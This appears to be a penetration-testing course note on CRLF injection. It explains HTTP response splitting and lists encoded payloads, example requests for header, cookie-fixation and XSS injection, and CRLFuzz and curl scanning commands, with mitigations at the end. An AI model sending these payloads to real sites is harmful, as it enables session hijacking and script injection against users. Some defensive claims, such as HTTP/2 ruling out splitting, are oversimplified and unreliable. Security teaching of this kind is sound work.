---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.09 CRLF Injection"
---

# 10.09 — CRLF Injection

## What is CRLF?

```
CR  = Carriage Return = \r = 0x0D
LF  = Line Feed       = \n = 0x0A
CRLF = \r\n = HTTP/email line ending

HTTP USES CRLF TO SEPARATE:
  Request/response lines
  Headers from each other
  Headers from body (double CRLF)

EMAIL USES CRLF TO SEPARATE:
  Email headers from each other
  Headers from body (double CRLF)

SHELL USES \n TO SEPARATE:
  Commands in scripts
  Log lines
```

---

## HTTP Response Splitting (Deep Dive)

```
VULNERABILITY:
  User input placed into HTTP response headers without stripping \r\n
  
ATTACK — INJECT XSS INTO RESPONSE:
  GET /redirect?url=https://target.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
  
  RESULTING RESPONSE:
  HTTP/1.1 302 Found
  Location: https://target.com
  Content-Type: text/html       ← INJECTED HEADER!
                                ← INJECTED BLANK LINE!
  <script>alert(1)</script>     ← INJECTED BODY!
  
  Browser: sees Content-Type: text/html → renders as HTML → XSS!
```

---

## CRLF Injection Payload Reference

```
ENCODING:           CHARACTER
----------          ---------
%0d%0a              \r\n (standard URL encoding)
%0d                 \r
%0a                 \n
%E5%98%8A           ≈ \n (Unicode normalization trick)
%E5%98%8D           ≈ \r (Unicode normalization trick)
%23%0d%0a           # followed by \r\n
%3f%0d%0a           ? followed by \r\n
```

---

## CRLF Attack Types

### 1. Header Injection

```
INJECT EXTRA HEADER:
  GET /?url=test%0d%0aX-Evil:hacked HTTP/1.1
  
  Response:
  HTTP/1.1 200 OK
  X-Evil: hacked       ← INJECTED!
```

### 2. Cookie Injection (Session Fixation)

```
INJECT SET-COOKIE:
  GET /?next=/dashboard%0d%0aSet-Cookie:sessionid=ATTACKER_VALUE HTTP/1.1
  
  Response:
  HTTP/1.1 302 Found
  Location: /dashboard
  Set-Cookie: sessionid=ATTACKER_VALUE   ← INJECTED!
  
  → Victim's session ID set to attacker's chosen value!
  → Attacker can use this session if victim logs in!
```

### 3. XSS via Response Splitting

```
INJECT NEW CONTENT-TYPE + BODY:
  GET /?ref=x%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
  
  Response body becomes the injected HTML → XSS!
```

### 4. Cache Poisoning

```
If caches store the injected response:
  → All users receive the attacker's injected content!
  → Persistent impact across all users!
  → Often affects CDN-cached responses
```

---

## Testing with CRLFuzz

```bash
# INSTALL:
go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest

# BASIC SCAN:
crlfuzz -u "https://target.com/redirect?url=FUZZ"

# WITH CUSTOM PAYLOAD:
crlfuzz -u "https://target.com/redirect?url=FUZZ" \
  --payload "%0d%0aX-Test:injected"

# VERBOSE:
crlfuzz -u "https://target.com/" -v

# FROM FILE:
crlfuzz -u "https://target.com/" -l urls.txt

# SCAN ALL PARAMS:
# CRLFuzz tries insertion in URL, each parameter, path

# MANUAL CURL:
curl -v "https://target.com/redirect?url=test%0d%0aX-Test:injected" 2>&1 | grep -i "x-test"
```

---

## Finding CRLF Injection Points

```bash
# PARAMETERS THAT REDIRECT:
?url=
?redirect=
?next=
?return=
?returnTo=

# HEADERS SET FROM USER INPUT:
# (harder to identify without source code)
# Try common: ref, src, origin

# TEST EACH WITH:
%0d%0aX-Test:crlftest

# CONFIRM WITH:
curl -v "URL_WITH_PAYLOAD" 2>&1 | grep -i "x-test"
```

---

## Defense

```
STRIP OR REJECT \r AND \n FROM HEADER VALUES:
  
  Python (Flask):
    # Flask strips \n by default in header values
    # Verify by testing; add explicit check if needed:
    value = value.replace('\r', '').replace('\n', '')
  
  Java (Spring):
    # Spring Boot's ResponseEntity encodes special chars
    # But if manually setting headers:
    value = value.replaceAll("[\r\n]", "");
  
  PHP:
    header("Location: " . str_replace(["\r","\n"], '', $url));
  
  Express (Node.js):
    // Express sanitizes header values since version 4.x
    // Still validate to be safe
  
HTTP/2:
  HTTP/2 uses binary framing — CRLF splitting not possible!
  HTTP/1.1 still vulnerable!
  
REDIRECT VALIDATION:
  Only redirect to same-origin URLs
  Whitelist allowed redirect destinations
```

---

## Related Notes
- [[07 - HTTP Header Injection]] — broader header injection
- [[13 - XSS via HTTP Response Splitting]] — XSS via CRLF
- [[06 - Email Header Injection]] — CRLF in email headers
